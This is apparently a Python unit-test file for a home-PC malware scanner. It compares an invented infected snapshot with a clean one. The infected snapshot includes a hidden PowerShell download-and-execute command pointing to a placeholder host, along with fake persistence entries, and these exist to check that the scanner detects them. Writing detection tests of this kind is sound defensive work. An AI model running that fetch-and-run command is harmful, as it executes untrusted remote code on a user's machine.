"""Made-up snapshots of a PC: one with the signs of a real infection, one ordinary."""
import unittest

from gotchu import report, scan

INFECTED = {
    "processes": [
        {"pid": 1, "name": "dllhost.exe", "path": r"C:\Windows\SysWOW64\dllhost.exe",
         "cmd": r'"C:\Windows\SysWOW64\dllhost.exe"'},
        {"pid": 2, "name": "ytpBe8kRg.exe", "cmd": "",
         "path": r"C:\Users\A\AppData\Local\Temp\tmp-58250-EWdPbhsMNXbT\ytpBe8kRg.exe"},
        {"pid": 3, "name": "svchost.exe", "path": r"C:\Users\A\AppData\Roaming\svchost.exe", "cmd": ""},
        {"pid": 4, "name": "powershell.exe", "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "cmd": "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')"},
    ],
    "tasks": [{"name": r"\Windows Service Task", "hidden": True, "highest": True, "exists": False, "enabled": True,
               "exe": r"C:\Users\A\AppData\Local\Updates\WindowsService.exe"}],
    "run": [{"key": "HKCU", "name": "upd", "value": r"C:\Users\A\AppData\Local\Temp\a.exe"}],
}

ORDINARY = {
    "processes": [
        {"pid": 1, "name": "dllhost.exe", "path": r"C:\Windows\System32\dllhost.exe",
         "cmd": r"C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}"},
        {"pid": 2, "name": "Discord.exe", "path": r"C:\Users\A\AppData\Local\Discord\app-1.0\Discord.exe", "cmd": ""},
        {"pid": 3, "name": "explorer.exe", "path": r"C:\Windows\explorer.exe", "cmd": ""},
        {"pid": 4, "name": "powershell.exe", "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "cmd": "powershell.exe -NoProfile -Command Invoke-Expression $script"},
    ],
    "tasks": [{"name": r"\ZoomUpdateTask", "hidden": False, "highest": False, "exists": True, "enabled": True,
               "exe": r"C:\Users\A\AppData\Roaming\Zoom\bin\Zoom.exe"}],
    "run": [{"key": "HKCU", "name": "Discord", "value": r"C:\Users\A\AppData\Local\Discord\Update.exe"}],
    "proxy": {"enabled": False, "server": "", "pac": ""},
    "defender": {"known": True, "realtime": True},
    "forced_extensions": [],
}


class ScanTests(unittest.TestCase):
    def test_infected_snapshot(self):
        titles = " | ".join(t for s, t, _ in scan.analyse(INFECTED) if s == "HIGH")
        for expected in ("Hijacked Windows helper", "drop folder", "Fake Windows program",
                         "downloads and runs code", "Suspicious auto-start task", "start with Windows from Temp"):
            self.assertIn(expected, titles)

    def test_ordinary_snapshot_is_clean(self):
        self.assertEqual(report.level(scan.analyse(ORDINARY)), "ok")


if __name__ == "__main__":
    unittest.main()
